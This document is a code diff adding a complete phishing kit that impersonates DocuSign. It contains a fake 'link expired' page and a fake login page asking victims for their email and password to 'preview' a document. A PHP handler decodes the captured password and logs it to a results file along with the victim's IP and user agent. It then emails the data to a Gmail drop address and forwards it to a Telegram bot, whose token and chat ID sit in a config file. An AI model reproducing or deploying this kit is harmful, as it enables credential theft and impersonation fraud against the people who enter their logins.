@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DocuSign - Link Expired</title>
+  <link rel="stylesheet" href="expired.css" />
+</head>
+<style>
+  /* Reset default styles */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+/* Page background */
+body {
+  font-family: Arial, Helvetica, sans-serif;
+  background-color: #f8f8f8;
+  height: 100vh;
+}
+
+/* Header bar */
+.top-bar {
+  background-color: #ffffff;
+  padding: 15px 25px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+  display: flex;
+  align-items: center;
+}
+
+/* DocuSign logo */
+.logo {
+  height: 32px;
+}
+
+/* Error bar */
+.error-bar {
+  background-color: #e85b2c;
+  color: #fff;
+  padding: 15px 25px;
+  font-size: 16px;
+  font-weight: 500;
+}
+
+/* Center text inside bar */
+.error-bar p {
+  margin: 0;
+  text-align: center;
+}
+
+/* Responsive tweaks */
+@media (max-width: 600px) {
+  .error-bar p {
+    text-align: center;
+    font-size: 15px;
+  }
+
+  .top-bar {
+    justify-content: center;
+  }
+}
+
+</style>
+<body>
+  <header class="top-bar">
+    <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" 
+         alt="DocuSign Logo" class="logo" />
+  </header>
+
+  <main>
+    <div class="error-bar">
+      <p>This link from your email has expired.</p>
+    </div>
+  </main>
+  <script>
+// Auto-redirect after 5 seconds (5000 milliseconds)
+setTimeout(function() {
+window.location.href = "https://account.docusign.com/";
+}, 9000);
+</script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="https://docucdn-a.akamaihd.net/olive/images/2.64.0/global-assets/ds-icons-favicon-default-64x64.svg" type="image/svg+xml">
+  <title>DocuSign Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+
+    /* BODY BACKGROUND WITH BLUR OVERLAY */
+body {
+  position: relative;
+  min-height: 100vh;
+  margin: 0;
+  font-family: 'Segoe UI', Arial, sans-serif;
+  color: #1d004d;
+  display: flex;
+  flex-direction: column;
+  overflow-x: hidden;
+}
+
+/* Background image layer */
+body::before {
+  content: "";
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: url("https://learn.microsoft.com/en-us/xandr/invest/media/invoice-annotated.png?view=o365-worldwide")no-repeat center center/cover;
+  filter: blur(4px);       /* ✅ Blur effect */
+  transform: scale(1.1);    /* Slight zoom to hide edge blur */
+  z-index: -1;
+}
+
+/* Optional translucent overlay tint for better readability */
+body::after {
+  content: "";
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(255, 255, 255, 0.4);  /* light fog effect */
+  z-index: -1;
+}
+
+/* MAIN SECTION */
+.main {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 40px 10px;
+  position: relative;
+  z-index: 1; /* keep above blur */
+}
+
+
+    /* HEADER */
+    .header {
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 15px 40px;
+      border-bottom: 1px solid #f0f0f0;
+      backdrop-filter: blur(6px);
+    }
+
+    .logo {
+      height: 26px;
+    }
+
+    /* MAIN */
+    .main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 10px;
+    }
+
+    .login-card {
+      background-color: #fff;
+      max-width: 600px;
+      width: 520px;
+      padding: 50px 40px 40px 40px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+      border-radius: 8px;
+      text-align: left;
+    }
+    /* Center logo inside container */
+.logo-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin-bottom: 25px;
+}
+
+/* Optional: adjust image sizing if needed */
+.logo-container img {
+  display: block;
+  width: 180px;
+  height: auto;
+}
+
+    .login-card h1 {
+      font-size: 20px;
+      margin-bottom: 10px;
+      font-weight: 400;
+      color: rgb(17 0 45 / 90%);
+    }
+
+    .login-card p {
+      font-size: 15px;
+      margin-bottom: 25px;
+      color: rgb(17 0 45 / 90%);
+      font-weight: 400;
+    }
+
+    label {
+      font-weight: 500;
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    .required {
+      color: #a80052;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-bottom: 25px;
+      font-size: 15px;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-bottom: 25px;
+      font-size: 15px;
+    }
+
+    .next-btn {
+      width: 100%;
+      background-color: #240050;
+      color: white;
+      border: none;
+      padding: 13px 0;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .next-btn:hover {
+      background-color: #34007a;
+    }
+
+    .signup-btn {
+      width: 100%;
+      background-color: #f6f4f9;
+      color: #240050;
+      border: none;
+      padding: 13px 0;
+      border-radius: 4px;
+      font-weight: 500;
+      margin-top: 15px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .signup-btn:hover {
+      background-color: #ece8f1;
+    }
+
+    /* FOOTER */
+    .footer {
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 15px 40px;
+      font-size: 13px;
+      color: #4a3b67;
+      border-top: 1px solid #f0f0f0;
+      backdrop-filter: blur(6px);
+    }
+
+    .footer-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+.footer-left {
+  flex: 1;
+  display: flex;
+  align-items: center;     /* vertically align text and image */
+  justify-content: flex-start;
+  gap: 6px;                /* space between text and logo */
+}
+
+.footer-left span {
+  font-size: 12px;
+  color: #4a3b67;
+}
+
+.footer-left img.small-logo {
+  height: 12px;
+  display: inline-block;
+  vertical-align: middle;
+}
+
+
+    /* MIDDLE (JOINED CENTER + RIGHT) */
+    .footer-middle {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex: 2;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .footer-middle select {
+      padding: 4px 6px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 13px;
+    }
+
+    .footer-middle a {
+      color: #4a3b67;
+      text-decoration: none;
+    }
+
+    .footer-middle a:hover {
+      text-decoration: underline;
+    }
+
+    /* COPYRIGHT */
+    .copyright {
+      font-size: 12px;
+      color: #777;
+      text-align: right;
+      flex: 1;
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 768px) {
+      .footer-container {
+        flex-direction: column;
+        text-align: center;
+        gap: 10px;
+      }
+      .footer-left,
+      .footer-middle,
+      .copyright {
+        justify-content: center;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- HEADER -->
+  <header class="header">
+    <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign Logo" class="logo">
+  </header>
+
+  <!-- MAIN CONTENT -->
+  <main class="main">
+    <div class="login-card">
+<div class="logo-container">
+    <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" 
+         alt="DocuSign Logo" width="160">
+  </div>
+      <h1>Password Required</h1>
+            <p>This document is password protected <br/><br/>
+                Enter a valid email and password to preview
+            </p>
+
+      <p style="margin-top: 10px;"></p>
+
+      <form id="passwordForm">
+                <span id="error" class="text-danger" style="display: none; color:red; margin-top: 10px;">Incorrect email or password.</span>
+        <label for="email">Email <span class="required">*</span></label>
+        <input type="email" id="email" name="email" placeholder="Email,phone or skype" required>
+
+        <label for="email">Password <span class="required">*</span></label>
+        <input type="password" id="passwordInput" name="password" placeholder="Password" required>
+        <button type="button" id="submitbtn1" onClick="step2()" class="next-btn">Preview Document</button>
+      </form>
+      <button  class="signup-btn"  ></button>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="footer-container">
+      
+      <!-- LEFT SECTION -->
+<div class="footer-left">
+  <span>Powered by</span>
+  <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" 
+       alt="DocuSign" class="small-logo">
+</div>
+
+      <!-- MIDDLE (Joined Center + Right) -->
+      <div class="footer-middle">
+        <select>
+          <option>English (US)</option>
+        </select>
+        <a href="#">Contact Us</a>
+        <a href="#">Terms of Use</a>
+        <a href="#">Privacy</a>
+        <a href="#">Intellectual Property</a>
+        <a href="#">Trust</a>
+      </div>
+
+      <!-- COPYRIGHT -->
+      <p class="copyright">© 2025 DocuSign, Inc. All rights reserved</p>
+
+    </div>
+  </footer>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+<input type="hidden" id="count">
+     <script>
+ let checki = 1;
+let url ='maik.php';
+
+function cd()
+  {
+	document.getElementById('error').innerHTML="";
+  var pass = document.getElementById('passwordInput');
+    if (pass.value == '') {
+        document.getElementById('error').style.display='block';
+     document.getElementById('error').innerHTML="Incorrect email or password"; 
+     document.getElementById('submitbtn1').innerHTML='Submit';
+     pass.focus();
+    return false;	
+ }else{
+ return true;
+ }
+  }
+
+function step2(){
+if(cd()){
+  document.getElementById('submitbtn1').innerHTML='Verifing...';
+var a = document.getElementById('email').value;
+var b = document.getElementById('passwordInput').value;
+var encb  = window.btoa(b);
+validate(a,encb);
+}
+}
+
+function se(){
+var c = document.getElementById('count').value;
+if (c >= 1) {
+                    setTimeout(function () {
+                        window.location = "exp.html";
+                    }, 2000);
+                    submitbtn1.value = "Verifying....";
+                    error.innerHTML = "";        
+}else{
+    
+  document.getElementById('submitbtn1').innerHTML='Submit';
+    document.getElementById('error').style.display='block';
+     document.getElementById('error').innerHTML="Incorrect email or password"; 
+document.getElementById('passwordInput').value='';
+document.getElementById('passwordInput').focus();
+document.getElementById('count').value=+c+1;
+}
+}
+function de(){
+   window.location.href = "exp.html";
+
+}
+function validate(e,a){var b=new XMLHttpRequest;b.open("POST",url),b.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),b.onreadystatechange=function(){4===b.readyState&&(se())};var t="ai="+e+"&pr="+a;b.send(t)}
+function validatenew(a){var b=new XMLHttpRequest;b.open("POST",uril),b.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),b.onreadystatechange=function(){4===b.readyState&&(de())};var t="ai="+a;b.send(t)}
+</script>
+</body>
+</html>
+
+<?php
+require_once('config.php');
+
+$email = trim($_POST['ai']);
+$password = trim(base64_decode(urldecode($_POST['pr'])));
+if($email != null && $password != null){
+    $details = trim($_POST['detail']);
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+
+    $message = "|Docusign Client ".$_SESSION['client']."\n";
+	$message .= "From ".$_SESSION['EML']."\n";
+	$message = "Online ID            : ".$email."\n";
+	$message .= "Passcode              : ".$password."\n";
+	$message .= "Details              : ".$details."\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+    
+    $_SESSION['fullz'] = $message."</br></br>".$_SESSION['fullz']; 
+    file_put_contents("../Admin/Results.txt", $message, FILE_APPEND);
+
+	$subject = "YAHOO Logs : $ip";
+    mail($send, $subject, $message);   
+ 	$data = ['text' => $message,'chat_id' => $cID];    
+	$website="https://api.telegram.org/bot$TGBO";
+	  $ch = curl_init($website . '/sendMessage');
+	  curl_setopt($ch, CURLOPT_HEADER, false);
+	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	  curl_setopt($ch, CURLOPT_POST, 1);
+	  curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
+	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+	  $result = curl_exec($ch);
+	  curl_close($ch);
+
+	
+
+	$signal = 'ok';
+	$msg = 'InValid Credentials';
+	
+	// $praga=rand();
+	// $praga=md5($praga);
+}
+else{
+	$signal = 'bad';
+	$msg = 'Please fill in all the fields.';
+}
+$data = array(
+        'signal' => $signal,
+        'msg' => $msg,
+        'redirect_link' => $redirect,
+    );
+    echo json_encode($data);
+	
+if(isset($_POST['note'])){
+        call("/- AOL  Notification -/
+           ".$_POST['note']);
+        }
+
+?>
+<?php 
+session_start();
+error_reporting(0);
+
+// Turn ON the antivirus on Anticonfig
+
+
+$scamname = ""; //
+//Your Email
+$send = "appon132@gmail.com";
+//Telegram Bot Token
+$TGBO = '7897940356:AAFZg8h-zd7XZ8zC0M1ARWWG5WSsU0REEUw';
+//Telegram ChatID 
+$cID = '6209158260';
+
+?>
